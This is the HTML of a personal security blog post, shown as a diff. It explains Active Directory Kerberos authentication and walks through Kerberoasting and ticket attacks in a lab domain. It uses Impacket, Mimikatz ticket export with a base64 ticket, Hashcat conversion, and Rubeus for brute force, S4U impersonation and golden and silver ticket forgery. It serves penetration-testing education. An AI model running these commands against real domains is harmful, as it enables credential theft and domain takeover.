@@ -1,0 +1,844 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto">
+
+<head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>KERBEROS | OUHBOY</title>
+<meta name="keywords" content="Active-Directory">
+<meta name="description" content="Active Directory kerberos">
+<meta name="author" content="Malw0re">
+<link rel="canonical" href="https://malw0re.github.io/posts/active-directory/kerberos-101/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.5cfc680b1eeaeef9efbced92d46c2a9e876b72ee14fba85846afc4cff9e6e6f8.css" integrity="sha256-XPxoCx7q7vnvvO2S1Gwqnodrcu4U&#43;6hYRq/Ez/nm5vg=" rel="preload stylesheet" as="style">
+<script defer crossorigin="anonymous" src="/assets/js/highlight.f413e19d0714851f6474e7ee9632408e58ac146fbdbe62747134bea2fa3415e0.js" integrity="sha256-9BPhnQcUhR9kdOfuljJAjlisFG&#43;9vmJ0cTS&#43;ovo0FeA="
+    onload="hljs.initHighlightingOnLoad();"></script>
+<link rel="icon" href="https://malw0re.github.io/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="https://malw0re.github.io/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://malw0re.github.io/favicon-32x32.png">
+<link rel="apple-touch-icon" href="https://malw0re.github.io/apple-touch-icon.png">
+<link rel="mask-icon" href="https://malw0re.github.io/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --hljs-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+            }
+
+            .list {
+                background: var(--theme);
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-track {
+                background: 0 0;
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-thumb {
+                border-color: var(--theme);
+            }
+        }
+
+    </style>
+</noscript><meta property="og:title" content="KERBEROS" />
+<meta property="og:description" content="Active Directory kerberos" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://malw0re.github.io/posts/active-directory/kerberos-101/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2023-07-13T00:00:00+00:00" />
+<meta property="article:modified_time" content="2023-07-13T00:00:00+00:00" />
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="KERBEROS"/>
+<meta name="twitter:description" content="Active Directory kerberos"/>
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "Posts",
+      "item": "https://malw0re.github.io/posts/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "KERBEROS",
+      "item": "https://malw0re.github.io/posts/active-directory/kerberos-101/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "KERBEROS",
+  "name": "KERBEROS",
+  "description": "Active Directory kerberos",
+  "keywords": [
+    "Active-Directory"
+  ],
+  "articleBody": " Kerberoasting The Kerberos protocol defines how clients interact with a network authentication service, clients obtain tickets from the Kerberos Key Distribution Center (KDC) and they submit these tickets to application servers when connections are established. uses port 88 by default and depends on the process of symmetric key cryptography.\nNB [kerberos uses tickets to authenticate a user and completely avoids sending passwords across the network]\nHow Kerb Auth works! In every Active Directory domain, every domain controller runs a KDC service that provides requests for tickets to kerberos, which is the KRBTGT account in the AD domain.\nKerberos uses symmetric cryptography for encryption and decryption.\nFor explanation purposes, we use three colours to distinguish Hashes:\nBLUE _KEY: User NTLM HASH YELLOW_KEY: Krbtgt NTLM HASH RED_KEY: Service NTLM HASH Step 1: By sending the request message to KDC, the client initializes communication as:\nKRB_AS_REQ contains the following:\nThe username of the client is to be authenticated. The service SPN (SERVICE PRINCIPAL NAME) linked with the Krbtgt account An encrypted timestamp (Locked with User Hash: Blue Key) The entire message is encrypted using the User NTLM hash (Locked with BLUE KEY) to authenticate the user and prevent replay attacks.\nStep 2: The KDC uses a database consisting of Users/Krbtgt/Services hashes to decrypt a message (Unlock with BLUE KEY) that authenticates user identification.\nThen KDC will generate TGT (Ticket Granting Ticket) for a client that is encrypted using Krbtgt hash (Locked with Yellow Key) \u0026 some Encrypted Message using User Hash.\nKRB_AS_REP contains the following:\nUsername Some encrypted data, (Locked with User Hash: Blue Key) that contains: Session key The expiration date of TGT TGT, (Locked with Krbtgt Hash: Yellow Key) which contains: Username Session key The expiration date of TGT PAC with user privileges, signed by KDC Step 3: The KRB_TGT will be stored in the Kerberos tray (Memory) of the client machine, as the user already has the KRB_TGT, which is used to identify himself for the TGS request. The client sent a copy of the TGT with the encrypted data to KDC.\nKRB_TGS_REQ contains:\nEncrypted data with the session key Username Timestamp TGT SPN of requested service e.g. SQL service Step 4: The KDC receives the KRB_TGS_REQ message and decrypts the message using Krbtgt hash to verify TGT (Unlock using Yellow key), then KDC returns a TGS as KRB_TGS_REP which is encrypted using requested service hash (Locked with Red Key) \u0026 Some Encrypted Message using User Hash.\nKRB_TGS_REP contains:\nUsername Encrypted data with the session key: Service session key The expiration date of TGS TGS, (Service Hash: RED Key) which contains: Service session key Username The expiration date of TGS PAC with user privileges, signed by KDC Step 5: The user sends the copy of TGS to the Application Server,\nKRB_AP_REQ contains:\nTGS Encrypted data with the service session key: Username Timestamp, to avoid replay attacks Step 6: The application attempts to decrypt the message using its NTLM hash and to verify the PAC from KDC to identify user Privilege which is an optional case.\nStep 7: KDC verifies PAC (Optional)\nStep 8: Allow the user to access the service for a specific time.\nSPNs The Service Principal Name (SPN) is a unique identifier for a service instance. Active Directory Domain Services and Windows provide support for Service Principal Names (SPNs), which are key components of the Kerberos mechanism through which a client authenticates a service.\nImportant Points\nIf you install multiple instances of a service on computers throughout a forest, each instance must have its SPN. Before the Kerberos authentication service can use an SPN to authenticate a service, the SPN must be registered on the account. A given SPN can be registered on only one account. An SPN must be unique in the forest in which it is registered. If it is not unique, authentication will fail. SPNS syntax The SPN syntax has four elements\nType of SPN Host-based SPNs which is associated with the computer account in AD, it is randomly generated 128-character long password which is changed every 30 days; hence it is no use in Kerberoasting attacks SPNs that have been associated with a domain user account where NTLM hash will be used. Linux Perspective Attack Procedure. Depending on your positioning a network, Kerberos attacks can be performed in multiple ways.\nFrom a non-domain joined Linux host using valid domain user credentials. From a domain-joined Linux host as root after retrieving the keytab file. From a domain-joined Windows, the host is authenticated as a domain user. From a domain-joined Windows host with a shell in the context of a domain account. As SYSTEM on a domain-joined Windows host. From a non-domain joined Windows host using runas /netonly. Tools. Some tools can be utilized to perform the attack.\nImpacket’s GetUserSPNs.py from a non-domain joined Linux host. A combination of the built-in setspn.exe Windows binary, PowerShell, and Mimikatz. From Windows, utilizing tools such as PowerView, Rubeus, and other PowerShell scripts. REMEMBER!!!\nObtaining a TGS ticket via kerberoasting does not guarantee a set of valid credentials and the ticket still must be cracked offline to obtain the cleartext password.\nTGS tickets generally take longer to crack than other formats such as NTLM hashes, so often, unless a weak password is set, it can be difficult or impossible to obtain the cleartext using s standard cracking rig.\nThe efficiency of Attack While it can be a great way to move lateral or escalate privileges in a domain kerberoasting and the presence of SPNs does not guarantee us any level of access.\nWe might be in an environment where we crack a TGS ticket and obtain Domain Admin access straightway or obtain credentials that help us move down the path to domain compromise. Other times we may perform the attack and retrieve many TGS tickets, some of which we can crack, but none of the ones that crack are for privileged users, and the attack does not gain us any additional access.\nN/B - When writing a report this finding is termed as high-risk in the first two cases. Third case we may Kerberos and end up unable to crack a single TGS ticket even after mad days of cracking attempts with Hashcat. This would be dropped as a medium-risk issue to make the client aware of the risk of SPNs in the domain.\nREMEMBER!!!\nA prerequisite to performing Kerberoasting attacks is either domain user credentials (cleartext or just an NTLM hash if using Impacket), a shell in the context of a domain user, or account such as SYSTEM. Once we have this level of access, we can start. We must also know which host in the domain is a Domain Controller so we can query it.\nGetUserSPNs.py Listing SPN Accounts.\nGetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend\nRequesting all TGS tickets.** Later on, we can pull all TGS tickets for offline processing using the -request flag. The TGS tickets will be output in a format that can be readily provided to Hashcat or Johnny for offline password-cracking attempts.\nGetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request\nRequesting a Single TGS Ticket. Wte can also be more targeted and request just the TGS ticket for a specific account. Let’s try requesting one for just the required account.\nGetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user\nWith this ticket in hand, we could attempt, to crack the password offline, if successful we may end up with Domain Admin Rights.\nSaving the Ticket o facilitate offline cracking, it is always good to use the -outputfile flag to write the TGS tickets to a file that can then be run using Hashcat on our attack system or moved to a GPU cracking rig.\nGetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev -outputfile sqldev_tgs\nWindows Perspective Kerberoasting - Semi-Manual Method.\nEnumerating SPNs with setspn.exe setspn.exe -Q */* running the command you’ll notice many different SPNs returned for the various hosts in the domain.\nRetrieving All Tickets using setspn.exe setspn.exe -T INLANEFREIGHT.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }\nThe above command combines the previous command with setspn.exe to request tickets for all accounts with SPNs set.\nUsing Powershell we can request TGS tickets for an account in the shell and load them into memory, once they are loaded into memory we can extract them using Mimkatz.\nTargeting a Single User************** PS C:\\htb\u003e Add-Type -AssemblyName System.IdentityModel PS C:\\htb\u003e New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList \"MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433\" Before moving on, let’s break down the commands above to see what we are doing (which is essentially what is used by Rubeus when using the default Kerberoasting method):\nThe Add-Type cmdlet is used to add a .NET framework class to our PowerShell session, which can then be instantiated like any .NET framework object The AssemblyName parameter allows us to specify an assembly that contains types that we are interested in using System.IdentityModel is a namespace that contains different classes for building security token services We’ll then use the New-Object cmdlet to create an instance of a .NET Framework object We’ll use the System.IdentityModel.Tokens namespace with the KerberosRequestorSecurityToken class to create a security token and pass the SPN name to the class to request a Kerberos TGS ticket for the target account in our current logon session We can also choose to retrieve all tickets using the same method, but this will also pull all computer accounts, so it is not optimal.\nNow that the tickets are loaded, we can use Mimikatz to extract the ticket(s) from memory.\nExtracting Tickets from Memory with Mimikatz Using 'mimikatz.log' for logfile : OK mimikatz # base64 /out:true isBase64InterceptInput is false isBase64InterceptOutput is true mimikatz # kerberos::list /export [00000002] - 0x00000017 - rc4_hmac_nt Start/End/MaxRenew: 2/24/2022 3:36:22 PM ; 2/25/2022 12:55:25 AM ; 3/3/2022 2:55:25 PM Server Name: MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433 @ INLANEFREIGHT.LOCAL Client Name: htb-student @ INLANEFREIGHT.LOCAL Flags 40a10000 : name_canonicalize ; pre_authent ; renewable ; forwardable ; ==================== Base64 of file : 2-40a10000-htb-student@MSSQLSvc~DEV-PRE-SQL.inlanefreight.local~1433-INLANEFREIGHT.LOCAL.kirbi ==================== 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 ZWZyZWlnaHQubG9jYWw6MTQzMw== ==================== * Saved to file : 2-40a10000-htb-student@MSSQLSvc~DEV-PRE-SQL.inlanefreight.local~1433-INLANEFREIGHT.LOCAL.kirbi If we don’t specify the base64 /out:true command, Mimikatz will extract the tickets and write the to .kirbi files.\nNext, you prepare the base blob for cracking echo \"\" | tr -d \\\\n then place the above into a file and convert it back to a .kirbi file using the base64 utility.cat encoded_file | base64 -d \u003e sqldev.kirbi\nExtract the kerberos ticket using kirbi2john.py this will create a file called crack_file, which then must be modified to be able to use Hashcat against the hash python2.7 kirbi2john.py sqldev.kirbi\nModifying the crack file for hashcat sed 's/\\$krb5tgs\\$\\(.*\\):\\(.*\\)/\\$krb5tgs\\$23\\$\\*\\1\\*\\$\\2/' crack_file \u003e sqldev_tgs_hashcat now you can run the ticket through hashcat and get a clear password.\nSkipped Version So if we decide to skip the base64 output with mimkatz and type mimikatz # kerberos::list /export, the .kirbi file will be written to disk, in this case, you can download the file and run kirbi2john.py against them directly, skipping the base64 decoding step.\nAUTOMATE VERSION Using PowerView to extract the TGS ticket and convert them to Hashcat format.\nExtracting TGS Ticket\nPS C:\\htb\u003e Import-Module .\\PowerView.ps1 PS C:\\htb\u003e Get-DomainUser * -spn | select samaccountname PS C:\\htb\u003e Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat Target Specific User\nGet-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat\nExporting All Tickets to a CSV file and viewing the Content\nGet-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\\ilfreight_tgs.csv -NoTypeInformation\ncat .\\ilfreight_tgs.csv\nREBEUS https://github.com/GhostPack/Rubeus\nA tool capable of performing kerberoasting faster and easier by providing a variety of options to interact with kerberos\nhttps://www.hackingarticles.in/a-detailed-guide-on-rubeus/\nTicket Operations Working in an Active Directory environment depends on various tickets. For example, a Ticket Granting Ticket is an authentication token issued by the KDC which is used to request access from TGS for specific resources.\nIn this section, we’ll talk about Rubeus and its capability to play around with tickets.\nAsktgt Rubeus can generate raw AS-REQ traffic in order to ask for a TGT with a provided username and password. The password can also be encrypted in RC4, AES or DES encryption and it would still work. Let’s see an example where a clear-text password is supplied\nrubeus.exe asktgt /user:harshitrajpal /password: Password@1\nAs you can see above that a KRBTGT has been successfully generated which can be further used to generate TGS. The same can be achieved by providing an encrypted password. Let’s use a password encrypted with the RC4 cipher.\nrubeus.exe asktgt /user:harshitrajpal /rc4:64FBAE31CC352FC26AF97CBDEF151E03\nAsktgs\nRubeus has an asktgs option which can build raw TGS-REP requests by providing a ticket either in the CLI argument or by providing a path to a ticket.kirbi file placed on disk. Each TGS has a specified purpose.\nFor example, let’s create a TGS for the LDAP service. One or more service SPNs can be provided.\nrubeus.exe asktgs /user:harshitrajpal /ticket:doIFNDCCBTCgAwIBB...bA== /service:LDAP/dc1.ignite.local By providing in the TGT we generated in the previous step (copying in notepad and removing enters to type the ticket in a single line) we have generated a TGS successfully.\nKlist Klist command in Windows can be used to view the tickets generated in the system. Here, when we run klist command we can see that a KRBTGT and an LDAP TGS have been generated and stored in the session.\nRenew The renew function in Rubeus builds a TGT renewal exchange. We can specify a domain controller using the /dc flag which will be used as a destination for the renewal traffic. We can further use the tgtdeleg option with this and extract user’s credentials without elevation and keep it alive on another system for a week by default.\n/ptt flag can also be used in conjunction to apply the Kerberos\nrubeus.exe renew /dc:dc1.ignite.local /ticket:doIFNDCCB....bA==\n/autorenew sub-function will put the exchange to sleep for endTime 30 minutes and after that window automatically renew the TGT and display the renewed ticket\nrubeus.exe renew /dc:dc1.ignite.local /autorenew /ticket:doIFNDCCBTCgAw...bA==\nAs you may now observe that after a specified time interval a renewed TGT is shown\nBrute\nThe brute option in Rubeus can be used to perform a password bruteforce attack against all the existing user accounts in Active Directory. Many times, the same password is used with multiple accounts in real-life enterprise infrastructure. So, brute option can generate multiple TGTs in those accounts having the same password. /noticket can be used in conjunction with this option since no ticket is provided with this functionality. For example,\nrubeus.exe brute /password:Password@1 /noticket\nHash\nRubeus is capable of taking in passwords and generating hashes of them. These are of different formats including NTLM (rc4_hmac) hash. To do this, we can use a hash function and provide a domain using /domain, an account’s name (can be a machine account too) using the/user flag and the password using /password.\nrubeus.exe hash /user:harshitrajpal /domain:ignite.local /password:Password@1\nAs you can see 4 different hashes have been output. Various encryption ciphers are used in conjunction with popular hashing techniques. All of these ciphers are supported in AD environment and hence, may be used for different purposes.\nS4u\nWe saw above how we can generate hashes using Rubeus. Now let’s talk about one such attack where hashes can be used to impersonate another user and carry out delegation attacks. For a detailed write-up on delegation, and attacks follow the link here. In short, OS post-Windows server 2003 contained a Kerberos protocol extension called s4uself and s4uproxy. These protocols can be used to conduct delegation attacks. For example, in the example below, we have performed an attack called “Resource-Based Constrained Delegation” which benefits the msDS-AllowedToActOnBehalfOfAnotherIdentity option set in the attribute’s editor. Follow the article here for a full attack. In the example below, we’ll use the user noob’s hash and then impersonate Administrator account.\n/rc4: flag is used to provide user noob’s account.\n/impersonateuser: User that will be impersonated by noob.\n/msdsspn: A valid msDS-AllowedToActOnBehalfOfAnotherIdentity value for the account. Here, the domain controller\n/altservice: can be supplied to substitute one or more service names in the resulting .kirbi file.\n/ptt: Injects the resulting ticket in the current terminal session\nrubeus.exe s4u /user:noob$ /rc4:64FBAE31CC352FC26AF97CBDEF151E03 /impersonateuser:Administrator /msdsspn:host/dc1.ignite.local /altservice:cifs /domain:ignite.local /ptt\nThis would generate a ticket for Administrator user over the specified SPN. In short, we can now act as DC.\nGolden Ticket Golden tickets are forged KRBTGTs (Key Distribution Service account) which can be used to forge other TGTs. This provides an attacker persistence over the domain accounts. For a detailed walkthrough on the topic you can visit the article here.\nTo forge a golden ticket for user harshitrajpal, we first generate an AES hash (RC4 works too) using the hash command in Rubeus and then using the golden function like so. Here,\n/ldap: Retrieves information of user over LDAP protocol\n/user: Username whose ticket will be forged\n/printcmd: displays a one liner command that can be used to generate the ticket again that just got generated\nrubeus.exe hash /user:harshitrajpal /domain:ignite.local /password:Password@1\nrubeus.exe golden /aes256:EA2344691D140975946372D18949706857EB9C5F65855B0E159E54260BEB365C /ldap /user:harshitrajpal /printcmd\nAs you can see various details like SID, userID, Service Key etc are being fetched over LDAP which are important to generate a ticket. PAC signing is also done and a TGT generated for harshitrajpal\nAlso, at the end you’ll see a one liner command that can be used to generate this TGT again.\nVarious other options can be used in conjunction with golden to modify the generated TGT like:\n/rangeinterval: After every time specified, a new ticket will be generated.\n/rangeend: Specifies the maximum time tickets will be generated for. Here, 5 days. Since rangeinterval is 1d, 5 different tickets will be generated.\nFor a full list of modifications, see this page.\nSilver Ticket Silver tickets are forged Kerberos Ticket Granting Service (TGS) Tickets but with silver tickets there is no communication with the domain controller. It is signed by the service account configured with an SPN for each server the Kerberos-authenticating service runs on. For more details visit the page here.\nSilver ticket attack can be performed using Rubeus using silver function. Other customisations need be made like:\n/service: SPN of the service ticket is being generated for\n/rc4: Hash of a valid user (harshitrajpal here) which will be used to encrypt the generated ticket\n/user: username of the user whose hash is provided\n/creduser: User to be impersonated\n/credpassword: Password of the user to be impersonated\n/krbkey: used to create the KDCChecksum and TicketChecksum. This is the AES256 hmac sha1 hash in the following case.\n/krbenctype: type of encrypted hash used. Aes256 here.\nrubeus.exe hash /user:harshitrajpal /domain:ignite.local /password:Password@1\nrubeus.exe silver /service:cifs/dc1.ignite.local /rc4:64FBAE31CC352FC26AF97CBDEF151E03 /ldap /creduser:ignite.local\\Administrator /credpassword:Ignite@987 /user:harshitrajpal /krbkey:EA2344691D140975946372D18949706857EB9C5F65855B0E159E54260BEB365C /krbenctype:aes256 /domain:ignite.local /ptt\nThis helped us generate a silver ticker for Administrator account. And as a result, we are now able to access DC machine’s C drive\ndir \\\\dc1.ignite.local\\c$ Ticket Management Rubeus contains multiple ticket management options that may aid a pentester to conduct operations effectively and stealthily. As a pentester, we need to manage our generated tickets.\nPtt\nThe Rubeus ptt option can import the supplied ticket in command line. The /ptt can also be used in conjunction with other options that output tickets. For example,\nrubeus.exe ptt /ticket:doIFNDCCBTCgAwI...bA==\nAs you can see, the generated ticket has now been imported.\nPurge\nRubeus has a purge option which can purge/delete all the tickets existing in the current session.\nHere, we demonstrate how we purged 2 tickets listed by klist.\nrubeus.exe purge\nDescribe\nOften we lose track of the tickets in system. Describe option helps us to view details about a particular base64 encrypted blob or ticket.kirbi file.\nWe can provide the ticket using /ticket flag.\nrubeus.exe describe /ticket:doIFNDCCBTCg...bA==\nTriage\nWhile klist views tickets for current session triage lists all the tickets. When a session is being run as an administrator, we can not only view tickets in the current user’s session memory but other user’s tickets in memory too.\n/luid: This flag can be used to provide a specific user ID. rubeus.exe triage rubeus.exe triage /luid:*0x8f57c*\nAlso, when the LUID is known, we can purge particular user’s tickets too (elevated mode only)\nrubeus.exe purge /luid:*0x8f57c*\nDump\nIf the session is running in an elevated mode, a user can dump/ extract all the current TGTs and service tickets. Again, /luid can be provided to dump specific user’s tickets. /service can be used to filter these tickets.\nFor example, /service:krbtgt displays only TGTs.\nrubeus.exe dump\nNext part I’ll work on the mitigation bit as it’s own unit hope you learnt a few bit on the read … 😊\n",
+  "wordCount" : "3416",
+  "inLanguage": "en",
+  "datePublished": "2023-07-13T00:00:00Z",
+  "dateModified": "2023-07-13T00:00:00Z",
+  "author":{
+    "@type": "Person",
+    "name": "Malw0re"
+  },
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://malw0re.github.io/posts/active-directory/kerberos-101/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "OUHBOY",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "https://malw0re.github.io/favicon.ico"
+    }
+  }
+}
+</script>
+</head>
+
+<body class="" id="top">
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.body.classList.add('dark');
+    } else if (localStorage.getItem("pref-theme") === "light") {
+        document.body.classList.remove('dark')
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.body.classList.add('dark');
+    }
+
+</script>
+
+<header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="https://malw0re.github.io/" accesskey="h" title="OUHBOY (Alt + H)">OUHBOY</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="https://malw0re.github.io/posts/" title="posts">
+                    <span>posts</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://malw0re.github.io/about/" title="about">
+                    <span>about</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://malw0re.github.io/tags/" title="tags">
+                    <span>tags</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://malw0re.github.io/archives/" title="archives">
+                    <span>archives</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://malw0re.github.io/search/" title="🔍 (Alt &#43; /)" accesskey=/>
+                    <span>🔍</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    
+    <h1 class="post-title">
+      KERBEROS
+    </h1>
+    <div class="post-description">
+      Active Directory kerberos
+    </div>
+    <div class="post-meta">&lt;span title=&#39;2023-07-13 00:00:00 &#43;0000 UTC&#39;&gt;July 13, 2023&lt;/span&gt;&amp;nbsp;·&amp;nbsp;17 min&amp;nbsp;·&amp;nbsp;Malw0re
+
+</div>
+  </header> <div class="toc">
+    <details >
+        <summary accesskey="c" title="(Alt + C)">
+            <span class="details">Table of Contents</span>
+        </summary>
+
+        <div class="inner"><ul>
+                <li>
+                    <a href="#kerberoasting" aria-label="Kerberoasting">Kerberoasting</a><ul>
+                        
+                <li>
+                    <a href="#how-kerb-auth-works" aria-label="How Kerb Auth works!">How Kerb Auth works!</a></li></ul>
+                </li>
+                <li>
+                    <a href="#spns" aria-label="SPNs">SPNs</a><ul>
+                        
+                <li>
+                    <a href="#spns-syntax" aria-label="SPNS syntax">SPNS syntax</a></li>
+                <li>
+                    <a href="#type-of-spn" aria-label="Type of SPN">Type of SPN</a></li>
+                <li>
+                    <a href="#linux-perspective" aria-label="Linux Perspective">Linux Perspective</a><ul>
+                        
+                <li>
+                    <a href="#attack-procedure" aria-label="Attack Procedure.">Attack Procedure.</a></li>
+                <li>
+                    <a href="#tools" aria-label="Tools.">Tools.</a></li>
+                <li>
+                    <a href="#the-efficiency-of-attack" aria-label="The efficiency of Attack">The efficiency of Attack</a></li>
+                <li>
+                    <a href="#getuserspnspy" aria-label="GetUserSPNs.py">GetUserSPNs.py</a></li>
+                <li>
+                    <a href="#requesting-all-tgs-tickets" aria-label="Requesting all TGS tickets.**">Requesting all TGS tickets.**</a></li>
+                <li>
